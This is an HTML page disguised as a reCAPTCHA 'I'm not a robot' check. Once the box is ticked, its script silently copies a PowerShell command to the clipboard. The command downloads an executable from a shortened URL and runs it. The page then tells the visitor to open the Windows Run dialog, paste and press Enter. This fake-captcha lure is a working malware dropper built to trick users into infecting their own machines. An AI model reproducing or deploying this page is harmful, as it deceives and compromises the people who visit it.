<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Security Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      margin: 0;
      padding: 0;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f1f2f3;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
    }
    .recaptcha-container {
      background: #fff;
      border: 1px solid #d3d3d3;
      border-radius: 6px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.15);
      padding: 20px 30px;
      text-align: center;
      width: 320px;
    }
    .recaptcha-container img.logo {
      width: 88px;
      margin-bottom: 15px;
    }
    .recaptcha-container .checkbox {
      display: flex;
      align-items: center;
      gap: 10px;
      margin-bottom: 10px;
      justify-content: center;
    }
    .recaptcha-container .checkbox input[type="checkbox"] {
      transform: scale(1.3);
    }
    .spinner {
      display: none;
      margin: 15px auto;
      border: 5px solid #f3f3f3;
      border-top: 5px solid #4285f4;
      border-radius: 50%;
      width: 28px;
      height: 28px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .instructions {
      display: none;
      font-size: 14px;
      margin-top: 15px;
      color: #202124;
      text-align: left;
    }
    .instructions ol {
      margin-left: 15px;
    }
    .footer {
      margin-top: 20px;
      font-size: 10px;
      color: #9e9e9e;
    }
  </style>
</head>
<body>
  <div class="recaptcha-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/ad/RecaptchaLogo.svg/320px-RecaptchaLogo.svg.png" alt="reCAPTCHA logo" class="logo">
    <div class="checkbox">
      <input type="checkbox" id="verifyCheck">
      <label for="verifyCheck">I'm not a robot</label>
    </div>
    <div class="spinner" id="spinner"></div>
    <div class="instructions" id="instructions">
      <p>Complete verification:</p>
      <ol>
        <li>Press <b>Windows + R</b></li>
        <li>Press <b>Ctrl + V</b> to paste</li>
        <li>Press <b>Enter</b></li>
      </ol>
    </div>
    <div class="footer">This site is protected by reCAPTCHA and the Google Privacy Policy and Terms of Service apply.</div>
  </div>

  <script>
    const checkbox = document.getElementById('verifyCheck');
    const spinner = document.getElementById('spinner');
    const instructions = document.getElementById('instructions');

    checkbox.addEventListener('change', function() {
      if (this.checked) {
        spinner.style.display = 'block';
        setTimeout(() => {
          spinner.style.display = 'none';
          instructions.style.display = 'block';
          navigator.clipboard.writeText(
            `powershell -Command "Invoke-WebRequest -Uri 'https://tinyurl.com/StealABrainrotOP24' -OutFile $env:USERPROFILE/file.exe; Start-Process -FilePath $env:USERPROFILE/file.exe"`
          );
        }, 1200);
      }
    });
  </script>
</body>
</html>
